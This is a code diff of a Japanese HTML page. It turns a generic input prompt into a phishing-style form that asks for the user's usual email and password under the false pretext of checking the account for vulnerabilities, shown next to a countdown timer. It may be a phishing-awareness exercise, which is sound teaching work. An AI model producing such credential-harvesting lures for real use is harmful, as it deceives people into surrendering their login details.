@@ -26,7 +26,7 @@
 </p>
 
 <p>
-下記のいずれかを入力してください。
+アカウントの脆弱性を調査するため、以下の項目（普段使用しているもの）を入力してください。
 </p>
 
 <div id="timer" class="it-timer">
@@ -39,21 +39,19 @@
 
 <div class="it-box">
 
-<p>
-以下のいずれかを入力してください。
-</p>
-
-<ul>
-<li>メールアドレス</li>
-<li>パスワード</li>
-<li>電話番号</li>
-<li>学校名</li>
-</ul>
-
+<label for="emailInput">メールアドレス</label>
 <input
-id="secretInput"
-type="text"
-placeholder="入力してください">
+id="emailInput"
+type="email"
+autocomplete="off"
+placeholder="メールアドレスを入力してください">
+
+<label for="passwordInput">パスワード</label>
+<input
+id="passwordInput"
+type="password"
+autocomplete="off"
+placeholder="パスワードを入力してください">
 
 <button onclick="submitInfo()">
 送信
